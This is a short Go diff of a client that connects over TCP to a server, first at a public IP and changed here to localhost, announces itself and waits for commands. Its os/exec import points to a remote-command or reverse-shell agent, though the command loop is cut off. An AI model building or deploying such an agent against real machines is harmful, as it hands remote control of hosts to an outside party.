@@ -7,17 +7,21 @@ import (
 	"os"
 	"os/exec"
 	"strings"
-	"syscall" // 导入 syscall 包
+	"syscall"
 )
 
 func main() {
-	conn, err := net.Dial("tcp", "101.200.236.51:8080")
+	conn, err := net.Dial("tcp", "127.0.0.1:8080")
 	if err != nil {
 		fmt.Println("连接服务器失败:", err)
 		return
 	}
 	defer conn.Close()
 
+	// 添加此行代码 - 发送客户端标识符
+	conn.Write([]byte{'A'})
+
+	fmt.Println("已连接到服务器，等待命令...")
 	reader := bufio.NewReader(conn)
 
 	for {
